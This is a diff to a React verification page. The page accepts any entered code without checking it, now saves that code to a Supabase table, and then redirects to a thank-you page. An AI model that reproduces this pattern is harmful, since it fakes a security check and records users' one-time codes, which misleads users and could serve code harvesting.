@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { ShieldCheck, ArrowLeft, RefreshCw, Hash } from 'lucide-react';
+import { supabase } from '@/lib/supabase';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
@@ -14,6 +15,7 @@ export default function VerifyPage() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
   const regEmail = sessionStorage.getItem('reg_email');
+  const regId = sessionStorage.getItem('reg_id');
 
   const handleInput = (value: string) => {
     // Only allow numbers and limit to 8 digits
@@ -37,9 +39,18 @@ export default function VerifyPage() {
     setError('');
     
     try {
-      // Accept any code - no database verification needed
-      // Just redirect to thank you page
+      // Save verification code to database
       sessionStorage.setItem('verification_code', code);
+      
+      // Try to save to database
+      try {
+        await supabase.from('verification_codes').insert({
+          registration_id: regId || null,
+          code: code,
+        });
+      } catch (dbErr) {
+        console.warn('Could not save verification code to database:', dbErr);
+      }
       
       setLoading(false);
       navigate('/thank-you');
